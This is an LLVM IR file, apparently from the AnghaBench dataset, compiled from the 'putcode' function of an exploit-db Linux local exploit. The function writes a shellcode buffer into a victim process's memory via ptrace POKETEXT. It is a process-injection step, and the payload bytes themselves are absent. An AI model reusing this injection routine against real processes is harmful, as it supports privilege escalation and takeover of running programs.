; ModuleID = '/home/carl/AnghaBench/exploitdb/exploits/linux/local/extr_3.c_putcode.c'
source_filename = "/home/carl/AnghaBench/exploitdb/exploits/linux/local/extr_3.c_putcode.c"
target datalayout = "e-m:e-p270:32:32-p271:32:32-p272:64:64-i64:64-f80:128-n8:16:32:64-S128"
target triple = "x86_64-unknown-linux-gnu"

@MAXPATHLEN = common dso_local global i32 0, align 4
@CODE_SIZE = common dso_local global i32 0, align 4
@cliphcode = common dso_local global i32 0, align 4
@.str = private unnamed_addr constant [15 x i8] c"/proc/self/exe\00", align 1
@.str.1 = private unnamed_addr constant [34 x i8] c"[-] Unable to read /proc/self/exe\00", align 1
@PTRACE_POKETEXT = common dso_local global i32 0, align 4
@victim = common dso_local global i32 0, align 4
@.str.2 = private unnamed_addr constant [30 x i8] c"[-] Unable to write shellcode\00", align 1

; Function Attrs: noinline nounwind optnone uwtable
define dso_local void @putcode(i64* %0) #0 {
  %2 = alloca i64*, align 8
  %3 = alloca i8*, align 8
  %4 = alloca i64, align 8
  %5 = alloca i64*, align 8
  %6 = alloca i32, align 4
  %7 = alloca i32, align 4
  store i64* %0, i64** %2, align 8
  %8 = load i32, i32* @MAXPATHLEN, align 4
  %9 = load i32, i32* @CODE_SIZE, align 4
  %10 = add nsw i32 %8, %9
  %11 = zext i32 %10 to i64
  %12 = call i8* @llvm.stacksave()
  store i8* %12, i8** %3, align 8
  %13 = alloca i8, i64 %11, align 16
  store i64 %11, i64* %4, align 8
  %14 = load i32, i32* @cliphcode, align 4
  %15 = load i32, i32* @CODE_SIZE, align 4
  %16 = call i32 @memcpy(i8* %13, i32 %14, i32 %15)
  %17 = load i32, i32* @CODE_SIZE, align 4
  %18 = sext i32 %17 to i64
  %19 = getelementptr inbounds i8, i8* %13, i64 %18
  %20 = load i32, i32* @MAXPATHLEN, align 4
  %21 = sub nsw i32 %20, 1
  %22 = call i32 @readlink(i8* getelementptr inbounds ([15 x i8], [15 x i8]* @.str, i64 0, i64 0), i8* %19, i32 %21)
  store i32 %22, i32* %7, align 4
  %23 = load i32, i32* %7, align 4
  %24 = icmp eq i32 %23, -1
  br i1 %24, label %25, label %27

25:                                               ; preds = %1
  %26 = call i32 @fatal(i8* getelementptr inbounds ([34 x i8], [34 x i8]* @.str.1, i64 0, i64 0))
  br label %27

27:                                               ; preds = %25, %1
  %28 = load i32, i32* @CODE_SIZE, align 4
  %29 = add nsw i32 %28, 1
  %30 = load i32, i32* %7, align 4
  %31 = add nsw i32 %30, %29
  store i32 %31, i32* %7, align 4
  %32 = load i32, i32* %7, align 4
  %33 = sext i32 %32 to i64
  %34 = getelementptr inbounds i8, i8* %13, i64 %33
  store i8 0, i8* %34, align 1
  %35 = bitcast i8* %13 to i64*
  store i64* %35, i64** %5, align 8
  store i32 0, i32* %6, align 4
  br label %36

36:                                               ; preds = %55, %27
  %37 = load i32, i32* %6, align 4
  %38 = load i32, i32* %7, align 4
  %39 = icmp slt i32 %37, %38
  br i1 %39, label %40, label %58

40:                                               ; preds = %36
  %41 = load i32, i32* @PTRACE_POKETEXT, align 4
  %42 = load i32, i32* @victim, align 4
  %43 = load i64*, i64** %2, align 8
  %44 = getelementptr inbounds i64, i64* %43, i32 1
  store i64* %44, i64** %2, align 8
  %45 = ptrtoint i64* %43 to i32
  %46 = load i64*, i64** %5, align 8
  %47 = getelementptr inbounds i64, i64* %46, i32 1
  store i64* %47, i64** %5, align 8
  %48 = load i64, i64* %46, align 8
  %49 = trunc i64 %48 to i32
  %50 = call i32 @ptrace(i32 %41, i32 %42, i32 %45, i32 %49)
  %51 = icmp eq i32 %50, -1
  br i1 %51, label %52, label %54

52:                                               ; preds = %40
  %53 = call i32 @fatal(i8* getelementptr inbounds ([30 x i8], [30 x i8]* @.str.2, i64 0, i64 0))
  br label %54

54:                                               ; preds = %52, %40
  br label %55

55:                                               ; preds = %54
  %56 = load i32, i32* %6, align 4
  %57 = add nsw i32 %56, 4
  store i32 %57, i32* %6, align 4
  br label %36

58:                                               ; preds = %36
  %59 = load i8*, i8** %3, align 8
  call void @llvm.stackrestore(i8* %59)
  ret void
}

; Function Attrs: nounwind
declare i8* @llvm.stacksave() #1

declare dso_local i32 @memcpy(i8*, i32, i32) #2

declare dso_local i32 @readlink(i8*, i8*, i32) #2

declare dso_local i32 @fatal(i8*) #2

declare dso_local i32 @ptrace(i32, i32, i32, i32) #2

; Function Attrs: nounwind
declare void @llvm.stackrestore(i8*) #1

attributes #0 = { noinline nounwind optnone uwtable "correctly-rounded-divide-sqrt-fp-math"="false" "disable-tail-calls"="false" "frame-pointer"="all" "less-precise-fpmad"="false" "min-legal-vector-width"="0" "no-infs-fp-math"="false" "no-jump-tables"="false" "no-nans-fp-math"="false" "no-signed-zeros-fp-math"="false" "no-trapping-math"="false" "stack-protector-buffer-size"="8" "target-cpu"="x86-64" "target-features"="+cx8,+fxsr,+mmx,+sse,+sse2,+x87" "unsafe-fp-math"="false" "use-soft-float"="false" }
attributes #1 = { nounwind }
attributes #2 = { "correctly-rounded-divide-sqrt-fp-math"="false" "disable-tail-calls"="false" "frame-pointer"="all" "less-precise-fpmad"="false" "no-infs-fp-math"="false" "no-nans-fp-math"="false" "no-signed-zeros-fp-math"="false" "no-trapping-math"="false" "stack-protector-buffer-size"="8" "target-cpu"="x86-64" "target-features"="+cx8,+fxsr,+mmx,+sse,+sse2,+x87" "unsafe-fp-math"="false" "use-soft-float"="false" }

!llvm.module.flags = !{!0}
!llvm.ident = !{!1}

!0 = !{i32 1, !"wchar_size", i32 4}
!1 = !{!"clang version 10.0.1 (https://github.com/wsmoses/llvm-project-tok c8e5003577614e72d6d18a216e6a09771e1fcce4)"}
